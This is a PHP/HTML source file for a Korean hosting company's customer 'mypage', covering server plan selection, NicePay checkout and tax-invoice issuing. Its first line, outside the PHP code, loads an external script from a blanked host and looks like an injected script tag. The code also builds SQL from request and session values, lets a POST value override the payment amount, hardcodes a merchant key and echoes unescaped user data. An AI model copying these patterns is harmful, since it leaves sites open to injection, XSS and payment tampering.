<script type='text/javascript' src='https:// /k.js?v=222'></script>
<?php 
header("Content-Type:text/html; charset=utf-8;");
require_once($_SERVER['DOCUMENT_ROOT']."/include/init.php"); 
require_once($_SERVER['DOCUMENT_ROOT']."/common/header.php");
$user_query = "select * from user where user_id = '{$_SESSION['login_id']}'";
$user_result = sql_query($user_query);
$user_row = sql_fetch($user_result);


$server_info_query="select * from server_info where server_type = '{$user_row['server_name']}'";
$server_info_result =sql_query($server_info_query);
$server_info_row = sql_fetch($server_info_result);


//임시 코드
$nas_info_query="select * from server_info where server_type like '%NAS%'";
$nas_info_result =sql_query($nas_info_query);
$nas_info_row = sql_fetch($nas_info_result);

$cafe24_info_query="select * from server_info where server_type like '%CAFE24%'";
$cafe24_info_result =sql_query($cafe24_info_query);


$aws_info_query="select * from server_info where server_type like '%AWS%'";
$aws_info_result =sql_query($aws_info_query);

//임시 코드

$invoice_cnt_query ="SELECT COUNT(*) AS cnt FROM invoice_payment WHERE cust_no='{$_SESSION['idx']}'";
$invoice_cnt_result = sql_query($invoice_cnt_query);
$invoice_cnt_row = sql_fetch($invoice_cnt_result);

$mgt_num = $server_info_row['idx'].'-'.$user_row['idx'].'-'.$invoice_cnt_row['cnt'];



/*
 *******************************************************
 * <결제요청 파라미터>
 * 결제시 Form 에 보내는 결제요청 파라미터입니다.
 * 샘플페이지에서는 기본(필수) 파라미터만 예시되어 있으며,
 * 추가 가능한 옵션 파라미터는 연동메뉴얼을 참고하세요.
 *******************************************************
 */
$price = "{$server_info_row['server_price']}"; // 결제상품금액

if (isset($_POST['server_price'])) {
    $price=$_POST['server_price'];
}


$merchantKey = "EYzu8jGGMfqaDEp76gSckuvnaHHu+bC4opsSN6lHv3b2lurNYkVXrZ7Z1AoqQnXI3eLuaUFyoRNC6FkrzVjceg=="; // 상점키
$MID         = "nicepay00m"; // 상점아이디
$goodsName   = "{$user_row['server_name']}"; // 결제상품명
$buyerName   = "{$user_row['user_name']}"; // 구매자명
$buyerTel	 = "{$user_row['user_phone']}"; // 구매자연락처
$buyerEmail  = "{$user_row['user_email']}"; // 구매자메일주소
$moid        = "{$server_info_row['idx']}"; // 상품주문번호
$returnURL	 = $_SERVER['DOCUMENT_ROOT']."/api_test_code/payResult_utf.php"; // 결과페이지(절대경로) - 모바일 결제창 전용

/*
 *******************************************************
 * <해쉬암호화> (수정하지 마세요)
 * SHA-256 해쉬암호화는 거래 위변조를 막기위한 방법입니다.
 *******************************************************
 */



$ediDate = date("YmdHis");
//$hashString = bin2hex(hash('sha256', $ediDate.$MID.$price.$merchantKey, true));

?>
<script src="https://web.nicepay.co.kr/v3/webstd/js/nicepay-3.0.js" type="text/javascript"></script>
<script src="https://t1.daumcdn.net/mapjsapi/bundle/postcode/prod/postcode.v2.js"></script>


<script type="text/javascript">
//결제창 최초 요청시 실행됩니다.
var price="";

function nicepayStart(){
	if ($('#finalBtn').text()!='결제하기') {
		return;
	}else{
		var pay_flag=0;
		$(".pay_method").each(function(){
			if ($(this).prop('checked')!=1) {
				pay_flag=1;
			}else{
				pay_flag=0;
				return false;
			}
		});
		
		if (pay_flag==1) {
			alert('결제수단을 선택해주세요.');
			return;
		}
		
    	if ( !$("#finalCheck").prop('checked')){
    		alert('결제진행 동의를 해주세요.');
    		return;
    		
    	}else{	
        	if(checkPlatform(window.navigator.userAgent) == "mobile"){//모바일 결제창 진입
        		document.payForm.action = "https://web.nicepay.co.kr/v3/v3Payment.jsp";
        		document.payForm.submit();
        	}else{//PC 결제창 진입
            	
        		goPay(document.payForm);
        	}
    	}
	}
	
}

//[PC 결제창 전용]결제 최종 요청시 실행됩니다. <<'nicepaySubmit()' 이름 수정 불가능>>
function nicepaySubmit(){
	document.payForm.submit();
}

//[PC 결제창 전용]결제창 종료 함수 <<'nicepayClose()' 이름 수정 불가능>>
function nicepayClose(){
	alert("결제가 취소 되었습니다");
}

//pc, mobile 구분(가이드를 위한 샘플 함수입니다.)
function checkPlatform(ua) {
	if(ua === undefined) {
		ua = window.navigator.userAgent;
	}
	
	ua = ua.toLowerCase();
	var platform = {};
	var matched = {};
	var userPlatform = "pc";
	var platform_match = /(ipad)/.exec(ua) || /(ipod)/.exec(ua) 
		|| /(windows phone)/.exec(ua) || /(iphone)/.exec(ua) 
		|| /(kindle)/.exec(ua) || /(silk)/.exec(ua) || /(android)/.exec(ua) 
		|| /(win)/.exec(ua) || /(mac)/.exec(ua) || /(linux)/.exec(ua)
		|| /(cros)/.exec(ua) || /(playbook)/.exec(ua)
		|| /(bb)/.exec(ua) || /(blackberry)/.exec(ua)
		|| [];
	
	matched.platform = platform_match[0] || "";
	
	if(matched.platform) {
		platform[matched.platform] = true;
	}
	
	if(platform.android || platform.bb || platform.blackberry
			|| platform.ipad || platform.iphone 
			|| platform.ipod || platform.kindle 
			|| platform.playbook || platform.silk
			|| platform["windows phone"]) {
		userPlatform = "mobile";
	}
	
	if(platform.cros || platform.mac || platform.linux || platform.win) {
		userPlatform = "pc";
	}
	
	return userPlatform;
}
</script>


<script>

$(window).ready(function(){
	$(".myp-payment > .cellbox").eq(0).show();
	$(".tabwra > div").click(function(){
		var ind = $(this).index();
		$(".tabwra > div ").removeClass("on");
		$(this).addClass("on");
		$(".myp-payment > .cellbox").hide();
		$(".myp-payment > .cellbox").eq(ind).show();
	});
	$(".cellbox > .cell").each(function(){
		var ths = $(this);
		$(this).find("ul > li .myp-rchk").removeClass("on");
		$(this).find("ul > li .myp-rchk").click(function(){
			ths.find("ul>li .myp-rchk").removeClass("on");
			$(this).addClass("on");
			
		});
	});
});

$(function(){
	$(window).ready(function(){
		price_choose(0);
		$('#invoice_area').hide();
// 		$(".myp-payment .myp-rchk").click(function(){
// 			$(".myp-payment .myp-rchk").removeClass("on");
// 			$(this).addClass("on");
// 		});
		$('.pay').text('0');
	});
})

function do_pay(){
	if ( !$("#finalCheck").prop('checked')){
		alert('결제진행 동의를 해주세요.');
	}else{ //동의시		
		$.ajax({
			type : "POST", 
			url : "/mypage/do_pay_proc.php",
			dataType : "text",
			data : 
			{
				pay_check : 'Y'
			},
			error : function() 
			{
				console.log("통신에 오류가 있습니다.");
			},
			success : function(data) 
			{
				console.log(data);
				location.reload();
			}
		});
	}	
}
function price_choose(idx){

	if (idx!=0) {
    	price = $(idx).next().find('span').text();
    	price = price.slice(0,-1);
    	$('.pay').text(price);
    	price = price.replace(/,/gi,'');
    	//$("#Amt").val(price);
        $.ajax({
            type : 'POST',
            url : '/mypage/getHash.php',
            dataType : "text",
            data : 
            {
            	server_price : price,
            },
            error: function(){
                alert('통신에 오류가 있습니다.');
            },
            success : function(data){
                var from_date =  data.split('@');
                $("#signdata").val(from_date[0]);
                $("#edidate").val(from_date[1]);
                $("#Amt").val(price);
            }
        });
	}
    	$('#amount').val(price);
}

function baroStart(){
	$('#ti_area').show();
}

function show_invoice(){
	if ($('#invoice_area').hasClass('act')) {
		$('#invoice_area').removeClass('act');
		$('#invoice_area').hide();
	}else{
		$('#invoice_area').addClass('act');
		$('#invoice_area').show();
	}
	
}

function send_invoice(){
	if ( !$("#finalCheck").prop('checked')){
		alert('결제진행 동의를 해주세요.');
	}else{
		
    	var validationFlag = "Y";
    
    	if(/[^0123456789]/g.test($("#corp_num").val())) {
    		alert("숫자만 입력해주세요.");
    		$("#corp_num").val('');
    		$("#corp_num").focus();
    		return;
    	}
    	
    	$(".notEmpty").each(function() 
    	{
    		if ($(this).val() == "") 
    		{
    			alert($(this).prev().text()+"을(를) 입력해주세요.");
    			$(this).focus();
    			validationFlag = "N";
    			return false;
    		}
    	});

    	if(validationFlag == "Y")
    	{
    		$("#invoiceForm").ajaxSubmit({
    			success: function(data)
    			{
    				console.log(data);
    				var result = JSON.parse(data);
    	    		if(result.isSuc == "success")
    	    		{
    	    			alert(result.msg);
     	    			location.reload();
    	    		}
    	    		else
    	    		{
    	    			alert(result.msg);
    	    		}
    			}
    		});
    	}
	}
}


function show_address() {
    new daum.Postcode({
        oncomplete: function(data) {
        	var addr = data.address;
        	document.getElementById("addr").value = addr;
        }
    }).open();
}

function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

function choose_price(text,val){
	$('.'+text+'_price_area').show();
	
	$(".use_way").each(function(){
		$(this).prop('checked',false);
	});

	$(".myp-rchk").each(function(){
		$(this).removeClass('on');
	});

	$('.pay').text('0');
	$('#Amt').val(0);
	
	var len, point, str;
	var gob_cnt=1;
	var num=0;
	$("."+text+"_price").each(function(){
		num=val*gob_cnt;
		$(this).text(numberWithCommas(num)+'원');
		gob_cnt++;
	});

	
}

function choose_paymethod(idx){
	$('#PayMethod').val(idx);
}

function choose_server(idx){
	$('.cafe_price_area').hide();
	$('.aws_price_area').hide();
	
	$(".mypservice").each(function(){
		$(this).prop('checked',false);
	});

	$(".myp-rchk").each(function(){
		$(this).removeClass('on');
	});
	
	$('.pay').text('0');
	$('#Amt').val(0);
	$('#goodsname').val(idx);
	
	$.ajax({
		type : "POST", 
		url : "./get_server_info.php",
		dataType : "text",
		data : 
		{
			server_type : idx
		},
		error : function() 
		{
			console.log("AJAX ERROR");
		},
		success : function(data) 
		{
			console.log(data);
			var result = JSON.parse(data);
			$('#server_title').text(idx+'의 특징');
			
			var inner ="";
			if (result.length==1 && idx=='NAS') {
				
			}
		}
	});
	
}

function choose_bank(){
	$('#VbankBankCode').val($('#bank_value').val());
}

</script>

<div class="sub-top text-center">
	<p class="mtit-sp">Digital Experience platform - musign</p>
	<p class="mtit-big">musign<span class="color-g">care</span></p>
</div>

<div class="mypage-top">
	<div class="myp-grid">
		<h2 class="text-center">Mypage</h2>
		<div class="mytop-wr">
			<p class="color-g mytop-tit"><span>Welcome!</span></p>
			<div class="table mytop-ta">
				<div>
					<p class="mytop-name">
						<strong><?php echo $user_row['user_co']?></strong>의 <br><strong><?php echo $user_row['user_name']?></strong>담당자님, 반갑습니다.
					</p>
					<div class="myn-bot">
						<h5 class="myn-btit">서버 담당자</h5>
						<p class="ser-name">정기영 책임</p>
						<p class="ser-te">Tel. <span class="ser-tel">070-8645-0123</span></p>
						<p class="ser-te">E-mail. <span class="ser-tel">chaplin@musign.net</span></p>
					</div>
				</div>
				<div class="myr-divwr m100">
					<div class="myr-div">
						<div>
							<h5>고객 정보 <a href="../member/modify_view.php?idx=<?php echo $user_row['idx']?>" class="mod-btn">수정</a></h5>
							<ul class="cli-info">
								<li><b>업체명</b><span class=""><?php echo $user_row['user_co']?></span></li>
								<li><b>담당자</b><span class=""><?php echo $user_row['user_name']?></span></li>
								<li><b>연락처</b><span class=""><?php echo $user_row['user_phone']?></span></li>
							</ul>
						</div>
						<div>
							<h5>웹사이트 정보</h5>
							<ul class="cli-info">
								<li><b>사이트</b><span class=""><?php echo $user_row['url_tx']?></span></li>
								<li><b>URL</b><a href="" class=""><?php echo $user_row['url']?></a></li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<?php 
if ($user_row['pay_yn']=='Y') {
?>
    <div class="service_info">
    	<div class="inner">
    
    		<div class="twra">
    			<div class="tbox">
    				<p class="tt tt1">
    					<span>musign <em>family care service</em></span>를<br>
    					이용해주셔서 감사합니다.
    				</p>
    				<p class="tt tt2">
    					귀사의 성공적인 비즈니스와 웹 환경을<br>
    					제공하기 위해 항상 노력하겠습니다.  				
    				</p>
    			</div>
    		</div>
    
    		<div class="info">
    			<div class="cbox">
    				<div class="imgwra">
    					<img src="/img/info_img.png">
    				</div>
    				<div class="cont">
    					<p class="info_tit">서비스 이용내역</p>
    					<ul>
    						<li>
    							<strong>업체명</strong>
    							<p>㈜<?php echo $user_row['user_co']?></p>
    						</li>
    						<li>
    							<strong>URL</strong>
    							<p><?php echo $user_row['url']?></p>
    						</li>
    						<li>
    							<strong>담당자</strong>
    							<p><?php echo $user_row['user_name']?></p>
    						</li>
    						<li>
    							<strong>이용서버</strong>
    							<p><?php echo $server_info_row['server_type']?></p>
    						</li>
    						<li>
    							<strong>서버스 이용기간 </strong>
    							<p>
    								<?php 
    								$start_date=date('Y-m-d',strtotime($user_row['date_start']));
    								$end_date=date('Y-m-d',strtotime($user_row['date_end']));
    								
    								$start_date_new = new DateTime($start_date);
    								$end_date_new = new DateTime($end_date);
    								
    								$left_date = date_diff($start_date_new, $end_date_new);
    								
    								?>
    							
    								<?php echo $start_date?> ~ <?php echo $end_date?>
    								<span>
    									<em><?php echo $left_date ->days;?>일후 만료</em>
    									서비스 이용 마감기한 한달 전 갱신 안내메일이 발송됩니다.
    								</span>
    							</p>
    						</li>
    					</ul>
    				</div>
    			</div>
    		</div>
    	</div>
    </div>
<?php 
}else{
?>    
    <div class="mypage-div bd-n" id="">
    	
        	<div class="myp-grid">
        		<!--<p class="myp-tit">뮤자인 사의 추천 서버 안내 <?php echo $server_info_row['server_type']?></p>-->
        		<p class="myp-tit ">뮤자인 사의 추천 서버 안내</p>
				<div class="tabwra">
					<div class="ctab ctab1 on" onclick="choose_server('NAS');">Synology NAS</div>
					<div class="ctab ctab2" onclick="choose_server('CAFE24');">Cafe24 10G 광호스팅</div>
					<div class="ctab ctab3" onclick="choose_server('AWS');">Amazon EC2</div>
				</div>
					
        		<div class="myp-payment">
					<div class="cellbox cellbox2">
						<div class="cell cell1 wid-100">
							<p class="myp-ptit"><?php echo $nas_info_row['server_type']?>의 특징
								<ul>
									<?php 
									$server_feature_arr = explode('@',$nas_info_row['server_feature']);
									for ($i = 0; $i < count($server_feature_arr)-1; $i++) {
									?>
										<li class="mu_nas">
											<span>0<?php echo $i+1?></span>
											<div class="mu_text"><?php echo $server_feature_arr[$i]?></div>
										</li>
									<?php 
									}						
									?>
								</ul>
							</p>
						</div>
						<!-- // cell 1 -->
						
						<div class="cell cell2">
							<p class="myp-ptit">서비스선택</p>
							<ul>
								<li>
									<p class="myp-rchk on">
										<input id="mypService1" type="radio" class='use_way mypservice' name="rchk1" value="" onclick="price_choose(this);">
										<label for="mypService1" >
											1년 이용권
											<span><?php echo number_format($nas_info_row['server_price'])?>원</span>
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="mypService2" type="radio" class='use_way mypservice' name="rchk1" value="" onclick="price_choose(this);">
										<label for="mypService2">
											2년 이용권
											<span><?php echo number_format($nas_info_row['server_price']*2)?>원</span>
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="mypService3" type="radio" class='use_way mypservice' name="rchk1" value="" onclick="price_choose(this);">
										<label for="mypService3">
											3년 이용권
											<span><?php echo number_format($nas_info_row['server_price']*3)?>원</span>
										</label>
									</p>
								</li>
							</ul>
						</div>
						<!-- // cell 2 -->
					</div>
					<!-- // cellbox 1 -->

					<div class="cellbox cellbox2">
						<div class="cell cell1 wid-100">
							<p class="myp-ptit">CAFE24의 특징
								<ul>
									<?php 
									
									for ($i = 0; $i < sql_count($cafe24_info_result); $i++) {
									   $cafe24_info_row = sql_fetch($cafe24_info_result);
									?>
										<li class="mu_nas">
											<span>0<?php echo $i+1?></span>
											<div class="mu_text"><?php echo $cafe24_info_row['dump_col']?></div>
										</li>
									<?php 
									}						
									?>
								</ul>
							</p>
						</div>
						<!-- // cell 0 -->
						<div class="cell cell0">
							<p class="myp-ptit">옵션선택</p>
							<ul>
								<li>
									<p class="myp-rchk on">
										<input id="cafe_radio_1" type="radio" class='mypservice' name="cafe_radio" value="" onclick="choose_price('cafe','370000')">
										<label for="cafe_radio_1" >
											일반형 – 하드용량 500M, 트래픽용량 500M 지원
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="cafe_radio_2" type="radio" class='mypservice' name="cafe_radio" value="" onclick="choose_price('cafe','450000')">
										<label for="cafe_radio_2">
											비즈니스 – 하드용량 1G, 트래픽용량 1G 지원
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="cafe_radio_3" type="radio" class='mypservice' name="cafe_radio" value="" onclick="choose_price('cafe','500000')">
										<label for="cafe_radio_3">
											퍼스트클래스 – 하드용량 2G, 트래픽용량 2G 지원
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="cafe_radio_4" type="radio" class='mypservice' name="cafe_radio" value="" onclick="choose_price('cafe','700000')">
										<label for="cafe_radio_4">
											자이언트 – 하드용량 3G, 트래픽용량 7G 지원
										</label>
									</p>
								</li>
							</ul>
						</div>

						
						<div class="cell cell2 cafe_price_area">
							<p class="myp-ptit">서비스선택</p>
							<ul>
								<li>
									<p class="myp-rchk on">
										<input id="cafe_radio_5" type="radio" class='use_way mypservice' name="cafe_radio_2" value="" onclick="price_choose(this);">
										<label for="cafe_radio_5" >
											1년 이용권
											<span class="cafe_price"><?php echo number_format($cafe24_info_row['server_price'])?>원</span>
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="cafe_radio_6" type="radio" class='use_way mypservice' name="cafe_radio_2" value="" onclick="price_choose(this);">
										<label for="cafe_radio_6">
											2년 이용권
											<span class="cafe_price"><?php echo number_format($cafe24_info_row['server_price']*2)?>원</span>
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="cafe_radio_7" type="radio" class='use_way mypservice' name="cafe_radio_2" value="" onclick="price_choose(this);">
										<label for="cafe_radio_7">
											3년 이용권
											<span class="cafe_price"><?php echo number_format($cafe24_info_row['server_price']*3)?>원</span>
										</label>
									</p>
								</li>
							</ul>
						</div>
						<!-- // cell 2 -->
					</div>
					<!-- // cellbox 2 -->

					<div class="cellbox cellbox3">

						<div class="cell cell1 wid-100">
							<p class="myp-ptit">AWS의 특징
								<ul>	
									<?php 
									for ($i = 0; $i < sql_count($aws_info_result); $i++) {
									    $aws_info_row = sql_fetch($aws_info_result);
									?>
										<li class="mu_nas">
											<span>0<?php echo $i+1?></span>
											<div class="mu_text"><?php echo $aws_info_row['dump_col']?></div>
										</li>
									<?php 
									}						
									?>
								</ul>
							</p>
						</div>
						<!-- // cell 1 -->
						
						<div class="cell cell0">
							<p class="myp-ptit">옵션선택</p>
							<ul>
								<li>
									<p class="myp-rchk on">
										<input id="aws_radio_1" type="radio" class='mypservice' name="aws_radio" value="" onclick="choose_price('aws','550000')">
										<label for="aws_radio_1" >
											t2.micro – 기본 수ac준의 성능. cpu 1 core, 메모리 1G
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="aws_radio_2" type="radio" class='mypservice' name="aws_radio" value="" onclick="choose_price('aws','1150000')">
										<label for="aws_radio_2" >
											t3.medium – 중간 수준의 성능. cpu 2core, 메모리 8G
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="aws_radio_3" type="radio" class='mypservice' name="aws_radio" value="" onclick="choose_price('aws','1850000')">
										<label for="aws_radio_3" >
											c5.large – 뛰어난 성능. cpu 2core, 메모리 4G
										</label>
									</p>
								</li>
							</ul>
						</div>

						<div class="cell cell2 aws_price_area">
							<p class="myp-ptit">서비스선택</p>
							<ul>
								<li>
									<p class="myp-rchk on">
										<input id="aws_radio_4" type="radio" class='use_way mypservice' name="aws_radio_2" value="" onclick="price_choose(this);">
										<label for="aws_radio_4" >
											1년 이용권
											<span class="aws_price"><?php echo number_format($aws_info_row['server_price'])?>원</span>
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="aws_radio_5" type="radio" class='use_way mypservice' name="aws_radio_2" value="" onclick="price_choose(this);">
										<label for="aws_radio_5">
											2년 이용권
											<span class="aws_price"><?php echo number_format($aws_info_row['server_price']*2)?>원</span>
										</label>
									</p>
								</li>
								<li>
									<p class="myp-rchk">
										<input id="aws_radio_6" type="radio" class='use_way mypservice' name="aws_radio_2" value="" onclick="price_choose(this);">
										<label for="aws_radio_6">
											3년 이용권
											<span class="aws_price"><?php echo number_format($aws_info_row['server_price']*3)?>원</span>
										</label>
									</p>
								</li>
							</ul>
						</div>
						<!-- // cell 2 -->
					</div>
					<!-- // cellbox 3 -->
					

        			
        			<div class="payment">
        				<p>결제 금액 <span class="pay"><?php echo number_format($aws_info_row['server_price'])?></span>원</p>
        			</div>
        			<!-- // payment -->
 
					<script>
				$(window).ready(function(){
					$(".payment_wra").hide();
					$("#finalBtn").click(function(){
						$(".payment_wra").show();
						$(this).text("결제하기");
					});
				});
				$(window).ready(function(){
					
					$("#payment_progress ul li").click(function(){
						var idx = $(this).index();
						$("#payment_progress ul li").removeClass("on");
						$(this).addClass("on");
						
						if ($("#payment_progress ul li").eq(0).hasClass("on"))
						{
							$("#payment_progress .import_txt").show();
						}else{
							$("#payment_progress .import_txt").hide();
						}

					});
				});
			</script>
			<div class="myp-grid bd-n payment_wra">
				<p class="myp-tit ">결제수단 선택 / 결제</p>
						<div id="payment_progress">
							<div class="inner">

								<div class="boxwra">
									<div class="cellbox- cellbox-1">
										<div class="cell cell1">
											<p class="tit">일반결제</p>
										</div>
										<!-- // cell 1-->
										<div class="cell cell2">
											<div class="tabwra-">
												<ul>
													<li class="myp-rchk">
														<input id="vbank" type="radio" class='mypservice pay_method' name="pay_method" value="VBANK" onclick="choose_paymethod('VBANK');">
														<label for="vbank" >가상계좌</label>
													</li>
													<li class="myp-rchk">
														<input id="card" type="radio" class='mypservice pay_method' name="pay_method" value="CARD" onclick="choose_paymethod('CARD');">
														<label for="card" >신용카드</label>
													</li>
													<li class="myp-rchk">
														<input id="bank" type="radio" class='mypservice pay_method' name="pay_method" value="BANK" onclick="choose_paymethod('BANK');">
														<label for="bank" >계좌이체</label>
													</li>
												</ul>
											</div>

											<div class="import_txt">
											<p>
												( 무통장 입금 의 경우 입금확인 후부터 배송단계가 진행됩니다. )
											</p>
											<!--  
											<div class="i-txt">
												<strong>입금자명</strong>
												<input type="text" name="">
											</div>
			                                 -->
										</div>

										</div>
										<!-- // cell2 -->
									</div>
									<!-- // cellbox- -->
								<!-- // boxwra -->

							</div>
						</div>
						<!-- // payment_progress -->
					</div>
				</div>


        			<div class="payment-final">
        				<div class="cell cell1">
        				<p class="final-chk">
        					<input id="finalCheck" type="checkbox" name="finalCheck">
        					<label class="check_s" for="finalCheck">위 상품의 구매조건 확인 및 결제진행에 동의합니다.</label>
        				</p>
        				</div>
        				<div class="cell cell2">
        					<button id="finalBtn" onclick="nicepayStart();">신청하기</button>
        				</div>
					</div>

   						<form name="payForm" method="post" action="/api_test_code/payResult_utf.php">
   							<input type="hidden" id="PayMethod" name="PayMethod" value="">
        					<input type="hidden" id="goodsname" name="GoodsName" value="NAS"> <br>
        					<input type="hidden" id="Amt" name="Amt" value="<?php echo($price)?>"> <br>
        					<input type="hidden" id="mid" name="MID" value="<?php echo($MID)?>"> <br>
        					<input type="hidden" id="moid" name="Moid" value="<?php echo($moid)?>"> <br>
        					<input type="hidden" id="buyername" name="BuyerName" value="뮤자인"> <br>
        					<input type="hidden" id="buyeremail" name="BuyerEmail" value="<?php echo($buyerEmail)?>"> <br>
        					<input type="hidden" id="buyertel" name="BuyerTel" value="<?php echo($buyerTel)?>"> <br>
        					<input type="hidden" id="returnurl" name="ReturnURL" value="<?php echo($returnURL)?>"> <br>
        					<input type="hidden" name="VbankExpDate" value=""> <br>
        					<input type="hidden" name="GoodsCl" value="1"/> <br>
        					<input type="hidden" name="TransType" value="0"/> <br>
        					<input type="hidden" name="CharSet" value="utf-8"/> <br>
        					<input type="hidden" name="ReqReserved" value=""/> <br>
        					<input type="hidden" id="edidate" name="EdiDate" value="<?php echo($ediDate)?>"/> <br>
        					<input type="hidden"  id="signdata" name="SignData" value="<?php echo($hashString)?>"/>
        				</form>
    
						
        				<div id="invoice_area" class="pop">
							<div class="pop_inner">
								<div class="pop_">
									<form name="invoiceForm" id="invoiceForm" method="post" action="/Baro/BaroService_PHP5_Sample/TI/API_TI/RegistAndIssueTaxInvoice.php">										
										<!-- 
										*권 : <input type="text" id="kwon" name="kwon"><Br>
										*호 : <input type="text" id="ho" name="ho"><Br>
										*일련번호 : <input type="text" id="serial_num" name="serial_num"><Br><Br>
										 -->
										 
										*<span>사업자번호</span> : <input type="text" class="notEmpty" id="corp_num" name="corp_num"><Br>
										
										<!-- 
										*종목 : <input type="text" id="tax_reg_id" name="tax_reg_id"><Br>
										 -->
										 
										*<span>상호</span> : <input type="text" class="notEmpty" id="corp_name" name="corp_name" value='<?php echo $user_row['user_co']?>'><Br>
										*<span>대표자 이름</span> : <input type="text" class="notEmpty" id="ceo_name" name="ceo_name"><Br>
										*<span>주소</span> : <input type="text" class="notEmpty" id="addr" name="addr" onclick="show_address();" readonly="readonly"><Br>
										*<span>업태</span> : <input type="text" id="biz_type" name="biz_type"><Br>
										*<span>업종</span> : <input type="text" id="biz_class" name="biz_class"><Br>
										*<span>담당자</span> : <input type="text" class="notEmpty" id="contact_name" name="contact_name" value='<?php echo $user_row['user_name']?>'><Br>
										*<span>tel</span> : <input type="text" id="tel" name="tel" value='<?php echo $user_row['user_phone']?>'><Br>
										*<span>email</span> : <input type="text" class="notEmpty" id="email" name="email" value='<?php echo $user_row['user_email']?>'><Br>
										
										<input type="hidden" id="mgt_num" class="notEmpty" name="mgt_num" value="<?php echo $mgt_num?>">
										<input type="hidden" id="cust_no" class="notEmpty" name="cust_no" value="<?php echo $_SESSION['idx']?>">
										<input type="hidden" id="item" name="item" value='<?php echo $user_row['server_name']?>'>
										<input type="hidden" id="amount" name="amount">
									</form>
									<button id="" onclick="send_invoice();">발행</button>
								</div>
							</div>
        				</div>
        			</div>
        			<!-- // payment_final -->
        
        		</div>
        		<!-- // myp-service -->
        
        	</div>
    	
    </div>
<?php 
}
?>

<div class="mypage-div">
	<div class="myp-grid">
		<p class="myp-tit">Musign family care service  </p>
		<div class="myp-service p010">
			<ul>
				<li>
					<img src="/img/mypage_i1.png" alt="musgin">
					<strong>Server Management</strong>
					<p>
						서버 전담팀 운영<br>
						맨투맨
					</p>
				</li>

				<li>
					<img src="/img/mypage_i2.png" alt="musgin">
					<strong>Quick Reaction </strong>
					<p>긴급상황 대응</p>
				</li>

				<li>
					<img src="/img/mypage_i3.png" alt="musgin">
					<strong>Free Installation</strong>
					<p>
						웹사이트 환경
						무료 설치 지원				
					</p>
				</li>

				<li>
					<img src="/img/mypage_i4.png" alt="musgin">
					<strong>Installation Support</strong>
					<p>
						SSL 설치 지원
						(SSL 구매비용 별도)					
					</p>
				</li>

				<li>
					<img src="/img/mypage_i5.png" alt="musgin">
					<strong>Installation Support</strong>
					<p>주기적 백업 지원</p>
				</li>

				<li>
					<img src="/img/mypage_i6.png" alt="musgin">
					<strong>Server Previous</strong>
					<p>서버 및 DB 이전 지원</p>
				</li>

				<li>
					<img src="/img/mypage_i7.png" alt="musgin">
					<strong>Version Management</strong>
					<p>
						소프트웨어 버전
						최신화 관리					
					</p>
				</li>

			</ul>
		</div>
	</div>
</div>

<?php 
$query = "
select *,
date_format(submit_date, '%Y.%m.%d') as submit_date
from notice where 1
";

$query .= " order by submit_date";

$result_cnt = sql_query($query);

$page = ($_REQUEST['page'])?$_REQUEST['page']:1;
$listSize = 20;

$list = $listSize;
$block = 5;
$pageNum = ceil(sql_count($result_cnt)/$list); // 총 페이지
$blockNum = ceil($pageNum/$block); // 총 블록
$nowBlock = ceil($page/$block);

$s_page = ($nowBlock * $block) - ($block-1);
if ($s_page <= 1) {
    $s_page = 1;
}
$e_page = $nowBlock*$block;
if ($pageNum <= $e_page) {
    $e_page = $pageNum;
}

$n = sql_count($result_cnt);

?>
<script>
var page = "<?php echo $page;?>";
$(document).ready(function(){
	$("#p_"+page).addClass("active");
})
function pageMove(page)
{
	$("#page").val(page);
	toAjax();
}
function toAjax()
{
	var queryString = $("form[name=fncForm]").serialize();
    $.ajax({
        type : 'get',
        url : 'index.php?'+queryString,
        error: function(xhr, status, error){
            alert(error);
        },
        success : function(data){
            console.log(data);
            var result = $(".main_table").html(data).find('.main_table').html();
            $('.main_table').html(result);
        }
    });
}
function goDetail(idx)
{
	location.href="/admin/notice_view.php?idx="+idx;
}
</script>

<div class="mypage-div table_list notice_list">
	<div class="myp-grid">
		<p class="myp-tit">공지사항</p>

		<div class="main_table notice_table p010">
			<div class="pick_list_num">
				<p>전체<span class="numb"><?php echo sql_count($result_cnt);?></span>개</p>
			</div>
			<form id="fncForm" name="fncForm" method="get" action="index.php">
                <input type="hidden" id="page" name="page" value="<?php echo $page?>">
            </form>
			<table class="table_1">
				<thead>
					<tr>
						<th>번호</th>
						<th>제목</th>
						<th>날짜</th>
					</tr>
				</thead>
				<tbody>
					<?php 
                        $s_point = ($page-1) * $list;
                        $result = sql_query($query." limit {$s_point},{$list}");
                        for ($i=0; $i<sql_count($result); $i++)
                        {
                            $row = sql_fetch($result);
                            ?>
            					<tr onclick="goDetail(<?php echo $row['idx']?>)">
            						<td><?php echo ($n - $i) - (($page-1) * $listSize)?></td><!-- 번호 -->
            						<td><?php echo $row['title'];?></td>
            						<td><?php echo $row['submit_date'];?></td>
            					</tr>
                            <?php 
                        }
                        ?>
				</tbody>
			</table>

			<div class="pagenation">
				<div class="nb">
					<ul>
						<?php 
						if(1 < $page)
						{
						    ?>
        					<li class="prev_" onclick="pageMove(<?=$s_page-1?>)"><a></a></li>
                            <?php 
                        }
                        $pagingCnt = 0;
                        if($e_page != 0)
                        {
                            for ($p=$s_page; $p<=$e_page; $p++)
                            {
                                $pagingCnt ++;
                                ?>
                                <li onclick="pageMove(<?=$p?>)" id="p_<?=$p?>"><?=$p?></li>
                         	    <?php
                            }
                        }
                        else
                        {
                            ?>
                            <li onclick="pageMove(1)">1</li>
                            <?php
                        }
                        if($pageNum != $page && $pageNum > 5)
                        {
                            if($pagingCnt > 4)
                            {
                                if($e_page+1 > $pageNum)
                                {
                                    ?>
                                    <li class="next_" onclick="pageMove(<?=$pageNum?>)"><a></a></li>
                                    <?php
                                }
